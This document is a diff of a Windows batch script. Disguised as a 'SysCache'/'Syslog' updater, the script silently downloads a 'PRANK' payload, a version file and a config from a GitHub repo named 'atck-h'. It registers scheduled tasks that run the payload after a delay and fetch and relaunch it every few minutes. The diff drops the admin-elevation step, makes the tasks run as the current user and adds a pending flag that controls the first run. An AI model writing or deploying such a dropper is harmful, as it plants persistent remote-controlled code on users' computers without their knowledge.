@@ -2,15 +2,6 @@
 setlocal enabledelayedexpansion
 
 :: ============================================================
-:: Check for administrator privileges and relaunch if needed
-:: ============================================================
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
-:: ============================================================
 :: Configuration
 :: ============================================================
 set "BASE=%APPDATA%\SysCache"
@@ -19,6 +10,7 @@ set "PRANK=%BASE%\syslog.cmd"
 set "LOCAL_VER=%BASE%\local_version.txt"
 set "LOCAL_INTERVAL=%BASE%\interval.txt"
 set "INSTALL_FLAG=%BASE%\installed.flag"
+set "PENDING_FLAG=%BASE%\pending.flag"   :: Indicates first run is still waiting
 
 set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
 set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
@@ -29,7 +21,7 @@ set "DOWNLOAD=%TEMP%\sn.cmd"
 set "CONFIG=%TEMP%\config.txt"
 
 :: Default values (if GitHub unreachable)
-set "DEFAULT_INIT_DELAY=5"
+set "DEFAULT_INIT_DELAY=10"
 set "DEFAULT_INTERVAL=5"
 
 :: ============================================================
@@ -57,6 +49,9 @@ if "%1"=="--first-run" goto FIRST_RUN_TRIGGERED
 :: -----------------------------------------------------------------
 :: RECURRING RUN (triggered by the minute-interval task)
 :: -----------------------------------------------------------------
+
+:: If the initial delay is still pending, do NOT run the payload
+if exist "%PENDING_FLAG%" goto :EOF
 
 :: Download remote version and config silently
 powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
@@ -103,9 +98,9 @@ if exist "%LOCAL_INTERVAL%" (
 )
 
 if not "!LOCAL_INTERVAL!"=="!REMOTE_INTERVAL!" (
-    :: Update the scheduled task with the new interval (run with highest privileges)
+    :: Update the scheduled task with the new interval (run as current user)
     schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
-    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /rl HIGHEST /f >nul 2>&1
+    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /ru %USERNAME% /f >nul 2>&1
     echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 )
 
@@ -147,12 +142,15 @@ echo !REMOTE_INTERVAL!| findstr /r "^[0-9][0-9]*$" >nul || set "REMOTE_INTERVAL=
 :: Store the interval locally for future comparisons
 echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 
+:: Create pending flag to block premature execution
+echo Pending > "%PENDING_FLAG%"
+
 :: Calculate absolute time for the one‑time task (now + INIT_DELAY minutes)
 for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('HH:mm')"') do set "START_TIME=%%i"
 for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('MM/dd/yyyy')"') do set "START_DATE=%%i"
 
-:: Create the one‑time task that will launch the updater with --first-run (run with highest privileges)
-schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /rl HIGHEST /f >nul 2>&1
+:: Create the one‑time task (runs as current user, no admin needed)
+schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /ru %USERNAME% /f >nul 2>&1
 
 :: Mark installation as done
 echo Installed > "%INSTALL_FLAG%"
@@ -163,6 +161,9 @@ goto :EOF
 :: TRIGGERED BY THE INITIAL DELAY TASK (--first-run)
 :: ============================================================
 :FIRST_RUN_TRIGGERED
+
+:: Delete the pending flag – the first run is now happening
+del "%PENDING_FLAG%" 2>nul
 
 :: Download fresh config (interval may have changed during the waiting period)
 powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >nul 2>&1
@@ -187,11 +188,11 @@ echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
 :: Run the payload (visible) for the first time
 if exist "%PRANK%" start "" "%PRANK%"
 
-:: Create the recurring updater task with the current interval (run with highest privileges)
+:: Create the recurring updater task (run as current user)
 schtasks /delete /tn "SyslogUpdater" /f >nul 2>&1
-schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /rl HIGHEST /f >nul 2>&1
+schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /ru %USERNAME% /f >nul 2>&1
 
-:: Optionally delete the one‑time starter task (it won't run again, but clean up)
+:: Optionally delete the one‑time starter task
 schtasks /delete /tn "SyslogStarter" /f >nul 2>&1
 
 goto :EOF
